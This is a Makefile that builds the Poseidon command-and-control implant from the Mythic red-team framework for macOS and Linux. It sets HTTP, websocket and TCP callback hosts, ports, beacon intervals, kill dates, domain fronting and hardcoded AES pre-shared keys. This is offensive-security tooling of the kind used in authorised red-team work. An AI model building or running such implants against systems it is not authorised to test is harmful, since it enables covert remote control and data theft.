HTTP_UUID=e7a96942-82aa-4d42-b2d9-2ed40aa81dd8
HTTP_CALLBACK_HOST=http://127.0.0.1/mydata
HTTP_CALLBACK_PORT=80
HTTP_KILLDATE=2023-12-31
HTTP_CALLBACK_INTERVAL=5
HTTP_CALLBACK_JITTER=0
HTTP_POST_URI=data
HTTP_ENCRYPTED_EXCHANGE_CHECK=true
HTTP_HEADERS="{}"
HTTP_AESPSK=lUj/INWW9B0Bh0fcInhv765H2/Neonh9VQPCoxIhCGc=
HTTP_PROXY_PORT=
HTTP_PROXY_USER=
HTTP_PROXY_HOST=
HTTP_PROXY_BYPASS=False

WEBSOCKET_UUID=
WEBSOCKET_CALLBACK_HOST=ws://192.168.53.139
WEBSOCKET_CALLBACK_PORT=8082
WEBSOCKET_AESPSK=
WEBSOCKET_ENDPOINT_REPLACE=socket
WEBSOCKET_USER_AGENT=
WEBSOCKET_CALLBACK_INTERVAL=
WEBSOCKET_ENCRYPTED_EXCHANGE_CHECK=true
WEBSOCKET_DOMAIN_FRONT=
WEBSOCKET_CALLBACK_JITTER=

TCP_UUID=58934946-46e1-4152-a1ec-5b0598376d1c
TCP_PORT=8085
TCP_KILLDATE=2024-12-31
TCP_ENCRYPTED_EXCHANGE_CHECK=true
TCP_AESPSK=QftErgGIi3XqdyHPwqkUM8mZagU0q1pUZdAzai19AWQ=

BINARY_NAME=poseidon
C2_HTTP=http
C2_WEBSOCKET=websocket
C2_TCP=poseidon_tcp

build_darwin_http:
	GOOS=darwin go build -o ${BINARY_NAME}_${C2_HTTP}.bin -tags="${C2_HTTP} darwin" -ldflags=" \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_host=${HTTP_CALLBACK_HOST}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.UUID=${HTTP_UUID}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_port=${HTTP_CALLBACK_PORT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.killdate=${HTTP_KILLDATE}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_interval=${HTTP_CALLBACK_INTERVAL}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_jitter=${HTTP_CALLBACK_JITTER}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.post_uri=${HTTP_POST_URI}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.encrypted_exchange_check=${HTTP_ENCRYPTED_EXCHANGE_CHECK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.AESPSK=${HTTP_AESPSK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_port=${HTTP_PROXY_PORT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_user=${HTTP_PROXY_USER}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_host=${HTTP_PROXY_HOST}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_bypass=${HTTP_PROXY_BYPASS}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.headers=${HTTP_HEADERS}' \
" .

build_linux_http:
	GOOS=linux go build -o ${BINARY_NAME}_${C2_HTTP}_linux.bin -tags="${C2_HTTP} linux" -ldflags=" \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_host=${HTTP_CALLBACK_HOST}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.UUID=${HTTP_UUID}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_port=${HTTP_CALLBACK_PORT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.killdate=${HTTP_KILLDATE}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_interval=${HTTP_CALLBACK_INTERVAL}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_jitter=${HTTP_CALLBACK_JITTER}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.post_uri=${HTTP_POST_URI}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.encrypted_exchange_check=${HTTP_ENCRYPTED_EXCHANGE_CHECK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.AESPSK=${HTTP_AESPSK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_port=${HTTP_PROXY_PORT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_user=${HTTP_PROXY_USER}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_host=${HTTP_PROXY_HOST}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.proxy_bypass=${HTTP_PROXY_BYPASS}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.headers=${HTTP_HEADERS}' \
" .

build_darwin_tcp:
	go build -o ${BINARY_NAME}_${C2_TCP}.bin -tags="${C2_TCP}" -ldflags=" \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.UUID=${TCP_UUID}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.port=${TCP_PORT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.killdate=${TCP_KILLDATE}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.encrypted_exchange_check=${TCP_ENCRYPTED_EXCHANGE_CHECK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.AESPSK=${TCP_AESPSK}' \
" .

build_darwin_websocket:
	go build -o ${BINARY_NAME}_${C2_WEBSOCKET}.bin -tags="${C2_WEBSOCKET}" -ldflags=" \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_host=${WEBSOCKET_CALLBACK_HOST}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.UUID=${WEBSOCKET_UUID}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_port=${WEBSOCKET_CALLBACK_PORT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_interval=${WEBSOCKET_CALLBACK_INTERVAL}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.callback_jitter=${WEBSOCKET_CALLBACK_JITTER}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.encrypted_exchange_check=${WEBSOCKET_ENCRYPTED_EXCHANGE_CHECK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.AESPSK=${WEBSOCKET_AESPSK}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.domain_front=${WEBSOCKET_DOMAIN_FRONT}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.ENDPOINT_REPLACE=${WEBSOCKET_ENDPOINT_REPLACE}' \
-X 'github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles.USER_AGENT=${WEBSOCKET_USER_AGENT}' \
" .

run_darwin_http: 
	./${BINARY_NAME}_${C2_HTTP}.bin

run_darwin_tcp:
	./${BINARY_NAME}_${C2_TCP}.bin

build_and_run_http: build_darwin_http run_darwin_http

build_and_run_tcp: build_darwin_tcp run_darwin_tcp

build_darwin: build_darwin_http build_darwin_tcp build_darwin_websocket

build_linux: build_linux_http

clean_http:
	go clean
	rm ${BINARY_NAME}_${C2_HTTP}.bin
	rm ${BINARY_NAME}_${C2_TCP}.bin
	rm ${BINARY_NAME}_${C2_WEBSOCKET}.bin